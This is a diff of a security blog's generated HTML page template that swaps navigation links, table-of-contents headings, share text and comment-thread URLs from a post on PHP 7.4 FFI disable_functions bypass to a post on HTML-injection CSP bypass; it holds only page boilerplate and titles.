             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -387,16 +345,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/06/09/探讨XXE防御之setFeature设置/">
-                    探讨XXE防御之setFeature设置
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">
-                    浅谈几种Bypass disable_functions的方法
+                <a href="/2019/08/11/NoSQL注入之MongoDB/">
+                    NoSQL注入之MongoDB
                 </a>
             </div>
         
@@ -408,7 +360,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-题目分析"><span class="toc-number">1.</span> <span class="toc-text">0x01 题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PHP-7-4-新特性"><span class="toc-number">2.</span> <span class="toc-text">0x02 PHP 7.4 新特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#自定义对象序列化"><span class="toc-number">2.1.</span> <span class="toc-text">自定义对象序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Preload"><span class="toc-number">2.2.</span> <span class="toc-text">Preload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FFI"><span class="toc-number">2.3.</span> <span class="toc-text">FFI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-解题思路"><span class="toc-number">3.</span> <span class="toc-text">0x03 解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-以往劫持方法的局限性"><span class="toc-number">1.</span> <span class="toc-text">0x01 以往劫持方法的局限性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-HTML标签注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 HTML标签注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
         
     </div>
     <style>
@@ -444,7 +396,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"从RCTF nextphp看PHP7.4的FFI绕过disable_functions　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"利用HTML注入劫持标签Bypass CSP　| Mi1k7ea　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -466,8 +418,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'https://Mi1k7ea.github.com/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/';
-            this.page.identifier = '2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/';
+            this.page.url = 'https://Mi1k7ea.github.com/2019/08/18/利用HTML注入劫持标签Bypass-CSP/';
+            this.page.identifier = '2019/08/18/利用HTML注入劫持标签Bypass-CSP/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -489,15 +441,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/06/09/探讨XXE防御之setFeature设置/" title="上一篇: 探讨XXE防御之setFeature设置">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/" title="下一篇: 浅谈几种Bypass disable_functions的方法">
+            <a href="/2019/08/11/NoSQL注入之MongoDB/" title="下一篇: NoSQL注入之MongoDB">
                 <i class="fa fa-angle-right"></i>
             </a>
         
